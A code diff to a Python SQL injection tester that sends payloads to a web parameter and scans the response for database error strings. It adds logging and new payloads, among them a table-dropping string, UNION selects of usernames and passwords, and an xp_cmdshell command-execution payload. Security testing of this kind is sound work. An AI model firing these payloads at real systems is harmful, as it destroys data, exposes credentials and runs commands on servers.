@@ -20,7 +20,7 @@ class SecurityTester:
         bool
             True if the parameter is likely vulnerable, False otherwise.
         """
-        print(f"Testing {param_name} for SQL injection...")
+        print(f"Testing {param_name} for SQL injection with payload: {payload}")
         vulnerable = False
         # Construct the URL with the SQL injection payload
         target_url = f"{self.base_url}?{param_name}={payload}"
@@ -34,7 +34,8 @@ class SecurityTester:
             "warning: mysql",
             "ORA-00933",  # Oracle SQL error
             "SQLSTATE[42000]",  # MySQL SQL error
-            "syntax error"  # Generic SQL syntax error
+            "syntax error",  # Generic SQL syntax error
+            "Microsoft OLE DB Provider for SQL Server"  # MS SQL Server error
         ]
 
         for error in error_messages:
@@ -52,13 +53,18 @@ class SecurityTester:
         """
         Run security tests on the website.
         """
-        # Example SQL injection payloads including SELECT * statement
+        # List of SQL injection payloads
         sql_payloads = [
             "' OR '1'='1",  # Classic SQL Injection
+            "' OR '1'='1' --",  # SQL Injection with comment
+            "' OR '1'='1' /*",  # SQL Injection with block comment
             "'; DROP TABLE users; --",  # Destructive SQL Injection
             "' UNION SELECT * FROM users --",  # Attempt to select all data from a table
             "' UNION SELECT * FROM information_schema.tables --",  # Attempt to retrieve table names
             "' UNION SELECT username, password FROM users --",  # Attempt to retrieve specific columns
+            "' AND 1=1 --",  # SQL Injection with tautology
+            "' AND 1=2 --",  # SQL Injection with contradiction
+            "'; EXEC xp_cmdshell('dir'); --",  # SQL Server command execution
         ]
 
         # Test SQL injection on a specific parameter
